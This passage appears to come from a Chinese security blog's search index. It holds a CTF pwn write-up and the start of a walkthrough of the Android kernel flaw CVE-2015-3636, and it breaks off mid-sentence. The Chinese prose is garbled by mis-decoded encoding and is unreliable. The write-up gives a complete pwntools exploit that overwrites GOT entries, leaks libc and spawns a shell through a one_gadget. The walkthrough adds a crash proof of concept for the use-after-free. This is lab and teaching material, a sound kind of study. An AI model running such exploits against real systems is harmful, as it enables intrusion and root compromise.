```\n\n- gotè¡¨é¡¹ä¸­å­˜äº†libcåœ°å€ã€‚æŠŠstderrå¤„çš„å€¼æ”¹æˆgotè¡¨é¡¹çš„åœ°å€\n\nè¿™é‡Œä½¿ç”¨åä¸€ç§æ–¹æ³•ï¼Œæ³„éœ²snprintfçš„libcåœ°å€ï¼Œè¿›è€Œå¾—åˆ°libcåŸºå€ï¼Œä¸‰æ­¥ï¼š\n\n1. æ”¹å†™stderrï¼ˆ0x4040a0ï¼‰åœ°å€å¤„çš„å€¼ä¸ºsnprintfçš„gotè¡¨é¡¹åœ°å€ï¼ˆ0x404030ï¼‰\n2. æ”¹å†™setbufçš„gotè¡¨é¡¹ï¼ˆ0x404020ï¼‰ã€‚ç”±äº\"\\x20\"æ˜¯ç©ºæ ¼ï¼Œåœ¨scanfçš„æ—¶å€™ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åç§»ä¸€ä¸ªå­—èŠ‚å†™0x40401få¤„\n3. æ”¹exitçš„gotè¡¨é¡¹ï¼Œè®©ä¸‹æ¬¡å¾ªç¯è¿›å…¥startå‡½æ•°ï¼Œè§¦å‘`setbuf(stderr)`ï¼Œå³`puts(snprintf_got)`\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\n# gdb.attach(myio,\"b *0x40132b \\n c\")  # 2nd scanf\n# gdb.attach(myio,\"b *0x401379 \\n c\")  # setbuf\n\npayload1 = p64(0x401256)[:-1]    # return main\naaw(0x404058,payload1)      # exit_got: 0x404058\n\n# set stderr ,set setbuf_got\naaw(0x4040a0,p64(0x404030)[:-1])   # change: 0x4040a0 â€”â–¸ 0x404030 â€”â–¸ 0x7f90a4f14d60 (snprintf)\naaw(0x40401f,\"\\x00\\xd0\\x10\\x40\\x00\\x00\\x00\\x00\")                    #  è®©åœ°å€0x404020å¤„ä¸º0x4010d0ï¼Œå¾€å‰åç§»1å­—èŠ‚å†™å…¥\n\n# to exec setbuf(stderr) = puts(snprintf_got)\npayload1 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.recvline()\t\t\t# puts(stdin)\nmyio.recvline()\t\t\t# puts(stdout)\nlibc_snprintf = u64(myio.recvline()[:-1].ljust(8,b\"\\x00\"))\t\t# puts(snprintf_got)\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\nmyio.interactive()\n```\n\n\n\n## get shell\n\næœ‰äº†libcåœ°å€ï¼Œä¸€åˆ‡å°±å˜å¾—ç®€å•äº†ã€‚åªéœ€è¦æŠŠexitçš„gotè¡¨é¡¹å†…å®¹æ”¹æˆone_gadgetåœ°å€ï¼Œé€€å‡ºmainå‡½æ•°æ—¶å°±èƒ½get shellå•¦ã€‚æœ¬é¢˜æœ‰å¦‚ä¸‹ä¸‰æ¡one_gadgetã€‚\n\n```bash\n$ one_gadget ./lib/libc.so.6   \n0xe3afe execve(\"/bin/sh\", r15, r12)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [r12] == NULL || r12 == NULL\n\n0xe3b01 execve(\"/bin/sh\", r15, rdx)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xe3b04 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n```\n\nè°ƒè¯•æŸ¥çœ‹æœ€åä¸€æ¬¡scanfæ—¶çš„å¯„å­˜å™¨æƒ…å†µï¼Œå¦‚ä¸‹ã€‚è¿™é‡Œæˆ‘é€‰æ‹©0xe3b01è¿™æ¡gadgetã€‚\n\n```bash\n RAX  0x0\n RBX  0x401390 â—‚â€” endbr64 \n RCX  0x0\n*RDX  0x5555562a3320 â—‚â€” 0x0\n*RDI  0x7ffd7a2b3ec8 â—‚â€” 0x61616173243925 /* '%9$saaa' */\n*RSI  0x5555562a3320 â—‚â€” 0x0\n R8   0xffffffff\n*R9   0x7ffd7a2b3d50 â—‚â€” 0x0\n R10  0x40202e â—‚â€” 0x4c3b031b010073 /* 's' */\n*R11  0x7ffd7a2b3ed0 â—‚â€” '9$saaabbX@@'\n R12  0x401170 â—‚â€” endbr64 \n R13  0x7ffd7a2b41b8 â—‚â€” 0x1c\n R14  0x0\n R15  0x0\n*RBP  0x7ffd7a2b3ef0 â—‚â€” 0x0\n*RSP  0x7ffd7a2b3ec0 â—‚â€” 0xffffffff\n RIP  0x40132b â—‚â€” call   0x401140\n```\n\nå®Œæ•´expå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\n# gdb.attach(myio,\"b *0x40132b \\n c\")  # 2nd scanf\n# gdb.attach(myio,\"b *0x401379 \\n c\")  # setbuf\n\npayload1 = p64(0x401256)[:-1]    # return main\naaw(0x404058,payload1)      # exit_got: 0x404058\n\n# set stderr ,set setbuf_got\naaw(0x4040a0,p64(0x404030)[:-1])   # change: 0x4040a0 â€”â–¸ 0x404030 â€”â–¸ 0x7f90a4f14d60 (snprintf)\naaw(0x40401f,\"\\x00\\xd0\\x10\\x40\\x00\\x00\\x00\\x00\")                    #  è®©åœ°å€0x404020å¤„ä¸º0x4010d0ï¼Œå¾€å‰åç§»1å­—èŠ‚å†™å…¥\n\n# to exec setbuf(stderr) = puts(snprintf_got)\npayload1 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.recvline()\t\t\t# puts(stdin)\nmyio.recvline()\t\t\t# puts(stdout)\nlibc_snprintf = u64(myio.recvline()[:-1].ljust(8,b\"\\x00\"))\t\t# puts(snprintf_got)\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\npayload1 = p64(libc_base+0xe3b01)[:-1]    # exec /bin/sh\naaw(0x404058,payload1)      # exit_got: 0x404058\n\nmyio.interactive()\n```\n\n## æ€è€ƒ\n\n- ä»»æ„åœ°å€å†™çš„æ—¶å€™ï¼Œä¸€å®šè¦è§‚å¯Ÿå†™å…¥çš„åœ°å€é™„è¿‘ï¼Œæ˜¯å¦æœ‰å†™è¶…è¿‡äº†çš„æƒ…å†µ\n- å†™gotè¡¨æ—¶ï¼Œç¢°åˆ°å«\"\\x20\"ç­‰ç‰¹æ®Šå­—ç¬¦çš„åœ°å€æ—¶ï¼Œå¯ä»¥è€ƒè™‘åç§»ä¸€ä¸ªå­—èŠ‚/å‡ ä¸ªå­—èŠ‚å†™å…¥\n\n- pwné¢˜æ›¿æ¢ldå’Œlibcè¿›è¡Œè°ƒè¯•çš„æ–¹æ³•ï¼š\n\n  1. ä½¿ç”¨gdbï¼Œå‚è€ƒ[How to use a different ld-linux.so?](https://groups.google.com/g/gnu.gcc.help/c/EQyHkCF5QGo?pli=1)\n\n     ```bash\n     $ gdb ./lib/ld-2.31.so\n     (gdb) run --library-path ./lib ./bin/chall\n     ```\n\n  2. patch elfï¼Œå‚è€ƒ[åŠ è½½libc](https://xz.aliyun.com/t/6260)\n\n  3. ä½¿ç”¨pwntools pythonè„šæœ¬\n\n     ```python\n     myelf = ELF(\"./bin/chall\")\n     mylibc = ELF(\"./lib/libc.so.6\")\n     myld = ELF(\"./lib/ld-2.31.so\")\n     myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n     \n     gdb.attach(myio,\"b *0x40132b \\n c\")  \n     ```\n\n     ä¸Šé¢è¿™ç§æ–¹æ³•åªèƒ½æ–­åœ¨mainåï¼Œæƒ³æ–­åœ¨mainå‰ï¼Œéœ€è¦ä½¿ç”¨`gdb.debug(\"xxx\",\"b *0xaaaa \\n c\")`ï¼ˆè¿™ç§æ–¹æ³•ä¸‹ï¼Œå¦‚æœè¦æŒ‡å®šlibcå’Œldçš„è¯ï¼Œå¾—å…ˆé€šè¿‡patch elfæ”¹æ‰libcå’Œldçš„è·¯å¾„ï¼‰ã€‚å‚è€ƒï¼š[ä½¿ç”¨pwntools+gdbä¸‹æ–­ç‚¹åˆ°mainå‡½æ•°å‰](https://blog.csdn.net/fjh1997/article/details/105434992)\n\n\n\n\n\n","tags":["pwn"],"categories":["CTF"]},{"title":"ä¸€æ­¥ä¸€æ­¥åˆ©ç”¨CVE-2015-3636","url":"/2022/09/21/cve-2015-3636-52pojie-version/","content":"\n\n\nCVE-2015-3636æ¼æ´çš„æ€ä¼¤åŠ›å·¨å¤§ï¼Œèƒ½å¤Ÿrootå½“æ—¶å¤§å¤šæ•°çš„androidæ‰‹æœºï¼ˆ[è¿™äº›å¹´, æˆ‘ä»¬è™è¿‡çš„æ¼æ´by è…¾è®¯ç§‘æ©å®éªŒå®¤](https://keenlab.tencent.com/zh/2016/05/25/CVEs-in-KeenLab/)ï¼‰ã€‚ç§‘æ©å›¢é˜Ÿåˆ©ç”¨æ”¹è¿›è¿‡çš„fuzzå·¥å…· [Trinity](https://github.com/kernelslacker/trinity) å‘ç°äº†è¯¥æ¼æ´ï¼Œå¹¶åœ¨blackhat 2015é€šè¿‡è®®é¢˜ [Own your Android! Yet Another Universal Root](https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf) è¯¦ç»†è®²è¿°äº†è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ã€‚\n\nè¯¥æ¼æ´å‘ç”Ÿåœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆç½‘ç»œå±‚çš„å®ç°ä¸­ï¼ˆping_unhash()ï¼‰ï¼Œclientç«¯å‘æœåŠ¡å™¨ç«¯å‘èµ·è¿æ¥ï¼ˆconnect()å‡½æ•°ï¼‰æ“ä½œæ—¶ï¼Œæœªè€ƒè™‘åˆ°hlist_nulls_nodeèŠ‚ç‚¹åˆ é™¤çš„ç‰¹æ®Šæ€§ï¼ˆnode->pprevä¸ä¸ºnullï¼Œè€Œæ˜¯LIST_POISON2ï¼‰ï¼Œä»è€Œå¯¼è‡´äº†UAFæ¼æ´ã€‚\n\nè¢«freeçš„å¯¹è±¡æ˜¯[struct socket](https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104)ä¸­çš„struct sock *skï¼Œ[sockç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285)ä¸­æœ‰è®¸å¤šå‡½æ•°æŒ‡é’ˆã€‚å› æ­¤é€šè¿‡physmap sprayè¦†ç›–æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ï¼Œè¿›è€Œè·å–root shellã€‚\n\n# ç¯å¢ƒå‡†å¤‡\n\næ ¹æ®[å¾çˆ±ç ´è§£2016å®‰å…¨æŒ‘æˆ˜èµ›](https://www.52pojie.cn/thread-480759-1-1.html)ä¸­ç»™å‡ºçš„æ¼æ´ç¯å¢ƒï¼Œå‡†å¤‡å¦‚ä¸‹ä¸¤ä¸ªé•œåƒï¼š\n\n- [ubuntu14.04é•œåƒ](https://mirrors.aliyun.com/ubuntu-releases/14.04/ubuntu-14.04.6-desktop-amd64.iso?spm=a2c6h.25603864.0.0.10af5192cdIhXU)\n\n- [goldfishé•œåƒåŠå¯¹åº”emulator](http://down.52pojie.cn/Challenge/2016_Security_Challenge/android-problem-env.7z) - è§£å‹å¯†ç ï¼š63BBC624A1238F6434B37EEAA4535D6C\n\nè¯¥é¢˜ä¸­linuxå†…æ ¸çš„ç‰ˆæœ¬æ˜¯3.10ï¼Œä¸‹è½½æºç è¾…åŠ©åˆ†æï¼š[linux v3.10-rc1ç‰ˆæœ¬æºç ](https://github.com/torvalds/linux/tree/v3.10-rc1)\n\nåˆ†æä¹‹å‰ï¼Œå…ˆç”¨åˆ«äººçš„pocå’Œexpæ‰“ä¸€éï¼Œç¡®è®¤ç¯å¢ƒå’Œåˆ©ç”¨è„šæœ¬éƒ½æ²¡é—®é¢˜ã€‚\n\n## æµ‹è¯•poc\n\n> pocéƒ¨åˆ†ä»…ä»…ä½“ç°äº†è®¿é—®éæ³•åœ°å€å¯¼è‡´çš„å´©æºƒï¼ŒçœŸæ­£çš„åˆ©ç”¨éœ€è¦ç»•è¿‡å´©æºƒç‚¹ï¼Œè§¦å‘UAFï¼Œç„¶ååœ¨å…³é—­socketæ—¶åŠ«æŒæ§åˆ¶æµ\n\n[pocä»£ç -ndkç¼–è¯‘](poc.zip) ï¼Œmainå‡½æ•°ä»£ç å¦‚ä¸‹ï¼š\n\n```c\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n    struct sockaddr_in sa;\n    memset(&sa, 0, sizeof(sa));\n    sa.sin_family = AF_INET;\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n    \n    sa.sin_family = AF_UNSPEC;\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n    connect(sock, (const struct sockaddr *) &sa, sizeof(sa));\n```\n\næ‰§è¡Œpocåï¼Œkernel panicï¼Œæ˜¾ç¤º`Unable to handle kernel paging request at virtual address 00001360`ï¼Œä¸ºä»€ä¹ˆä¸æ˜¯0x200200å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºå‡ºé¢˜äººå¯¹è¿™ä¸ªå€¼åšäº†ä¿®æ”¹ï¼Œåˆ©ç”¨IDAé€†å‘Imageæ–‡ä»¶ï¼Œåœ¨`sub_FFFFFFC000409614()`å‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°0x1360è¿™ä¸ªå€¼ã€‚\n\n![image-20220724205457823](image-20220724205457823.png?size=600)\n\n![image-20220724205518889](image-20220724205518889.png?size=600)\n\n\n\n## æµ‹è¯•exp\n\n> æ¯”è¾ƒå¤æ‚ï¼Œåœ¨æ¼æ´åˆ©ç”¨å°èŠ‚è¯¦ç»†åˆ†æ\n\n[çœ‹é›ª2016æŒ‘æˆ˜èµ›exp.by.4B5F5F4B](https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636/jni)\n\nndkç¼–è¯‘åèƒ½æˆåŠŸæ‰§è¡Œ\n\n![image-20220724134020649](image-20220724134020649.png?size=600)\n\n> LQï¼šaarch64-gnu-linux-gcc é™æ€ç¼–è¯‘å’Œndkç¼–è¯‘çš„ç»“æœä¸ä¸€æ ·ï¼ˆ1. å¯¹å¤´æ–‡ä»¶çš„ä¾èµ–ï¼›2. systemæ— æ³•æ‰§è¡ŒæˆåŠŸ ï¼›3. mmapæ“ä½œä¸ä¸€æ ·ï¼‰ã€æœ€ç»ˆæœ‰æ²¡æœ‰å¯èƒ½é‡‡ç”¨é™æ€ç¼–è¯‘çš„æ–¹å¼åˆ©ç”¨æˆåŠŸï¼Ÿã€‘\n\n\n\n## å¦‚ä½•è°ƒè¯•\n\n> é¢˜ç›®ç»™çš„å¯åŠ¨ç¨‹åºåšäº†äº›å°è£…æ“ä½œï¼Œä¸ºäº†è·å¾—æœ€åŸå§‹çš„qemuå¯åŠ¨å‘½ä»¤ï¼Œéœ€åœ¨ç¨‹åºå¯åŠ¨åæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œæˆªå–å¯åŠ¨å‘½ä»¤\n\n`./startEmulator`å¯åŠ¨è™šæ‹Ÿæœºåï¼Œé€šè¿‡`ps -ef`æŸ¥çœ‹è¿›ç¨‹æƒ…å†µï¼Œå¾—çŸ¥æœ€ç»ˆæ˜¯é€šè¿‡qemu-system-aarch64ï¼ˆæ˜¯è°·æ­Œçš„android-qemuï¼‰æ¥å¯åŠ¨çš„ã€‚æˆ‘ä»¬éœ€è¦åˆ©ç”¨å®ƒçš„å¯åŠ¨å‚æ•°æ¥è°ƒè¯•ã€‚\n\n```\nbling     19263   2450  0 21:19 pts/1    00:00:00 /bin/bash ./startEmulator\nbling     19264  19263 98 21:19 pts/1    00:00:09 ./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0 -serial mon:stdio -kernel ./Image -initrd...\n```\n\nç”±äºå¯åŠ¨å‘½ä»¤è¾ƒé•¿ï¼Œterminalæ— æ³•å®Œå…¨æ˜¾ç¤ºå‘½ä»¤ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨cmdlineè·å–è¯¥å‘½ä»¤ï¼Œå¦‚ä¸‹ï¼š\n\n```shell\ncat /proc/<PID>/cmdline | xargs -0 echo\n# æˆ–è€…\npython3 -c \"print(open('/proc/8716/cmdline','rb').read().replace(b'\\x00',b' '))\"\n```\n\nå¾—åˆ°å¦‚ä¸‹å¯åŠ¨å‘½ä»¤\n\n```shell\n./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append 'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0' -serial mon:stdio -kernel ./Image -initrd ./ramdisk.img -drive index=0,id=sdcard,file=./system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=././userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=./cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=./system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios\n```\n\nè°ƒè¯•çš„è¯ï¼Œåœ¨ä»¥ä¸Šå‘½ä»¤ååŠ ä¸Š`-S -s`ï¼ˆgdbserveré»˜è®¤ç›‘å¬æœ¬åœ°1234ç«¯å£ï¼‰ï¼Œç„¶åå¦èµ·ä¸€ä¸ªterminalï¼Œæ‰§è¡Œ`gdb-multiarch`\n\n```shell\n$ gdb-multiarch\ngdb> set architecture aarch64\ngdb> target remote :1234\n# å¦‚æœç”¨gefè°ƒè¯•çš„è¯ï¼Œå¿…é¡»ç”¨å‘½ä»¤ï¼šgef-remote -q localhost:1234\n# å¦åˆ™ä¼šæŠ¥é”™- Command 'context' failed to execute properly, reason: 'NoneType' object has no attribute 'all_registers'\ngdb> c\n\n```\n\n# æ¼æ´åˆ†æ\n\n> è¯¥æ¼æ´å‘ç”Ÿåœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆç½‘ç»œå±‚çš„å®ç°ä¸­ï¼ˆping_unhash()ï¼‰ï¼Œclientç«¯å‘æœåŠ¡å™¨ç«¯å‘èµ·è¿æ¥ï¼ˆconnect()å‡½æ•°ï¼‰æ“ä½œæ—¶ï¼Œæœªè€ƒè™‘åˆ°hlist_nulls_nodeèŠ‚ç‚¹åˆ é™¤çš„ç‰¹æ®Šæ€§ï¼ˆnode->pprevä¸ä¸ºnullï¼Œè€Œæ˜¯LIST_POISON2ï¼‰ï¼Œä»è€Œå¯¼è‡´äº†UAFæ¼æ´ã€‚\n>\n> è¢«freeçš„å¯¹è±¡æ˜¯[struct socket](https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104)ä¸­çš„struct sock *skï¼Œ[sockç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285)ä¸­æœ‰è®¸å¤šå‡½æ•°æŒ‡é’ˆã€‚å› æ­¤é€šè¿‡physmap sprayè¦†ç›–æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ï¼Œè¿›è€Œè·å–root shellã€‚\n\näº†è§£linuxå†…æ ¸ç½‘ç»œåè®®æ ˆå‚è€ƒï¼š[è®¡ç®—æœºç½‘ç»œåŸºç¡€ â€” Linux å†…æ ¸ç½‘ç»œåè®®æ ˆ](https://www.cnblogs.com/jmilkfan-fanguiju/p/12789808.html)\n\næ ¹æ®pocå´©æºƒç°åœºæ‰“å°çš„logæ¥çœ‹ï¼Œè°ƒç”¨æµç¨‹æ˜¯è¿™æ ·çš„ï¼šSys_connect() --> inet_dgram_connect() --> udp_disconnect() --> ping_unhash()ã€‚è·Ÿç€æºç åˆ†æï¼Œinet_dgram_connect()å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\nint inet_dgram_connect(struct socket *sock, struct sockaddr *uaddr,\n\t\t       int addr_len, int flags)\n{\n\tstruct sock *sk = sock->sk;\n\n\tif (addr_len < sizeof(uaddr->sa_family))\n\t\treturn -EINVAL;\n\tif (uaddr->sa_family == AF_UNSPEC)\n\t\treturn sk->sk_prot->disconnect(sk, flags);\n\n\tif (!inet_sk(sk)->inet_num && inet_autobind(sk))\n\t\treturn -EAGAIN;\n\treturn sk->sk_prot->connect(sk, uaddr, addr_len);\n}\nEXPORT_SYMBOL(inet_dgram_connect);\n```\n\næ¼æ´åˆ†æ”¯æ˜¯`if (uaddr->sa_family == AF_UNSPEC)`ï¼Œè€Œsk->sk_prot->disconnectå¯¹åº”çš„å‡½æ•°æ˜¯è°å‘¢ï¼Ÿ\n\n> inet_init()ä¸­æ ¹æ®å®é™…åœºæ™¯å°†æŸä¸ª[struct inet_protosw inetsw_array](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1030)å…³è”åˆ°inetswï¼Œå†åœ¨inet_create()å‡½æ•°ä¸­åˆå§‹åŒ–sk->sk_protä¸ºå¯¹åº”çš„`.prot`ã€‚æœ¬é¢˜å¯¹åº”[IPPPROTO_ICMP](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1051)è¿™ä¸€ç»“æ„ï¼Œå¦‚ä¸‹ï¼š\n>\n> ```c\n> static struct inet_protosw inetsw_array[] =\n> {\n>        {\n> \t\t.type =       SOCK_DGRAM,\n> \t\t.protocol =   IPPROTO_ICMP,\n> \t\t.prot =       &ping_prot,\n> \t\t.ops =        &inet_dgram_ops,\n> \t\t.no_check =   UDP_CSUM_DEFAULT,\n> \t\t.flags =      INET_PROTOSW_REUSE,\n>        },\n> ```\n\nå› æ­¤ï¼Œsk->sk_prot->disconnectä¸­çš„disconnectå¯¹åº”[struct proto ping_prot](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L727)ä¸­çš„[udp_disconnect()](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/udp.c#L1306)ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```c\nint udp_disconnect(struct sock *sk, int flags)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\t/*\n\t *\t1003.1g - break association.\n\t */\n\n\tsk->sk_state = TCP_CLOSE;\n\tinet->inet_daddr = 0;\n\tinet->inet_dport = 0;\n\tsock_rps_reset_rxhash(sk);\n\tsk->sk_bound_dev_if = 0;\n\tif (!(sk->sk_userlocks & SOCK_BINDADDR_LOCK))\n\t\tinet_reset_saddr(sk);\n\n\tif (!(sk->sk_userlocks & SOCK_BINDPORT_LOCK)) {\n\t\tsk->sk_prot->unhash(sk);\n\t\tinet->inet_sport = 0;\n\t}\n\tsk_dst_reset(sk);\n\treturn 0;\n}\nEXPORT_SYMBOL(udp_disconnect);\n```\n\nå¦‚æœå½“å‰æœªç»‘å®šç«¯å£ï¼Œåˆ™è¿›å…¥`if (!(sk->sk_userlocks & SOCK_BINDPORT_LOCK))`åˆ†æ”¯ï¼Œè°ƒç”¨`sk->sk_prot->unhash(sk)`ï¼Œå¯¹åº”[ping_v4_unhash()](https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L135)å‡½æ•°ï¼ˆå‡½æ•°åè·Ÿé¢˜ç›®Imageä¸­çš„ä¸ä¸€æ ·ï¼‰ï¼Œå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\nstatic void ping_v4_unhash(struct sock *sk)\n{\n\tstruct inet_sock *isk = inet_sk(sk);\n\tpr_debug(\"ping_v4_unhash(isk=%p,isk->num=%u)\\n\", isk, isk->inet_num);\n\tif (sk_hashed(sk)) {\n\t\twrite_lock_bh(&ping_table.lock);\n\t\thlist_nulls_del(&sk->sk_nulls_node);\n\t\tsock_put(sk);\n\t\tisk->inet_num = 0;\n\t\tisk->inet_sport = 0;\n\t\tsock_prot_inuse_add(sock_net(sk), sk->sk_prot, -1);\n\t\twrite_unlock_bh(&ping_table.lock);\n\t}\n}\n```\n\nifåˆ†æ”¯çš„åˆ¤æ–­æ¡ä»¶æ˜¯`sk_hashed(sk)`ï¼Œç®€è¨€ä¹‹ï¼Œå¦‚æœ`sk->sk_node->pprev`é0ï¼Œå°±è¿›å…¥ifåˆ†æ”¯ã€‚ä¸‹é¢çœ‹çœ‹ifåˆ†æ”¯é‡Œçš„`hlist_nulls_del()`å‡½æ•°ï¼Œå°†`sk->sk_nulls_node`ä»é“¾è¡¨èŠ‚ç‚¹ä¸­åˆ é™¤ï¼Œå¹¶å°†`sk->sk_nulls_node->pprev`è®¾ç½®ä¸º`LIST_POISON2`ï¼ˆ0x200200ï¼Œæœ¬é¢˜ç¯å¢ƒä¸­ä¸º0x1360ï¼‰ã€‚\n\n`sk->sk_nulls_node`å³`sk->sk_node`ï¼Œå®ƒä¿©æ˜¯ä¸€ä¸ªunionã€‚\n\n```c\n# define POISON_POINTER_DELTA 0\n/*\n * These are non-NULL pointers that will result in page faults\n * under normal circumstances, used to verify that nobody uses\n * non-initialized list entries.\n */\n#define LIST_POISON1  ((void *) 0x00100100 + POISON_POINTER_DELTA)\n#define LIST_POISON2  ((void *) 0x00200200 + POISON_POINTER_DELTA)\n\nstatic inline void hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\t__hlist_nulls_del(n);\n\tn->pprev = LIST_POISON2;\n}\n\nstatic inline void __hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\tstruct hlist_nulls_node *next = n->next;\n\tstruct hlist_nulls_node **pprev = n->pprev;\n\t*pprev = next;\n\tif (!is_a_nulls(next))\n\t\tnext->pprev = pprev;\n}\n```\n\nå…³äºé“¾è¡¨åˆ é™¤æ—¶ä¸ºä»€ä¹ˆå°†`node->pprev`èµ‹å€¼ä¸º`LIST_POISON2`ï¼Œæ–‡ç«  [linuxåŒå‘é“¾è¡¨åˆ†æä¹‹list_delä¸­çš„æŠ€å·§](https://blog.csdn.net/z2007b/article/details/6370383) ä¸­è¯´æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•çš„ç›®çš„ã€‚\n\n`hlist_nulls_del()`åæ˜¯`sock_put()`ï¼Œè¯¥å‡½æ•°åœ¨skæ— å¼•ç”¨åï¼Œè°ƒç”¨`sk_free()`é‡Šæ”¾skèŠ‚ç‚¹ã€‚\n\n```c\nstatic inline void sock_put(struct sock *sk)\n{\n\tif (atomic_dec_and_test(&sk->sk_refcnt))\n\t\tsk_free(sk);\n}\n// è°ƒè¯•æ˜¾ç¤ºï¼Œç¬¬ä¸€æ¬¡æŒ‡å®šâ€œsa.sin_family = AF_UNSPECâ€è°ƒç”¨connect(sock, (const struct sockaddr *) &sa, sizeof(sa))æ—¶ï¼Œsk->sk_refcntçš„å€¼ä¸º2ï¼Œä¸ä¼šè¿›å…¥sk_freeã€‚\n// ç¬¬äºŒæ¬¡è°ƒç”¨connectè¿›å…¥è¯¥åˆ†æ”¯æ—¶ï¼Œï¼ˆmmap 0x200200/0x1360 åï¼‰ï¼Œsk->sk_refcntä¸º1ï¼Œå°†è¿›å…¥sk_free()æµç¨‹\n```\n\nä»¥ä¸Šæµç¨‹èµ°ç¬¬ä¸€éçš„æ—¶å€™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†èµ°ç¬¬äºŒéæ—¶ï¼Œç”±äº`sk->sk_node->pprev`ä¸ºéé›¶å€¼ï¼ˆ0x200200/0x1360ï¼‰ï¼Œå› æ­¤ä¼šè¿›å…¥`if(sk_hashed(sk))`åˆ†æ”¯ï¼Œç„¶åé¡ºåºæ‰§è¡Œ`hlist_nulls_del(&sk->sk_nulls_node)` å’Œ `sock_put(sk)`ã€‚å½“æ‰§è¡Œåˆ°å¦‚ä¸‹ä»£ç ç‰‡æ®µæ—¶ï¼Œç”±äº`n->pprev`ä¸º`0x200200/0x1360`ï¼Œå¯¼è‡´`*pprev = next`å‘ç”Ÿéæ³•åœ°å€è®¿é—®ï¼Œå†…æ ¸crashã€‚\n\n```c\nstatic inline void __hlist_nulls_del(struct hlist_nulls_node *n)\n{\n\tstruct hlist_nulls_node *next = n->next;\n\tstruct hlist_nulls_node **pprev = n->pprev;\n\t*pprev = next;\n```\n\nå¦‚æœåœ¨è®¿é—®è¯¥éæ³•åœ°å€å‰ï¼Œå…ˆåˆæ³•æ˜ å°„`0x200200/0x1360`è¿™å—åœ°å€åŒºåŸŸï¼Œå°±ä¸ä¼šåœ¨æ­¤å¤„å‘ç”Ÿå†…æ 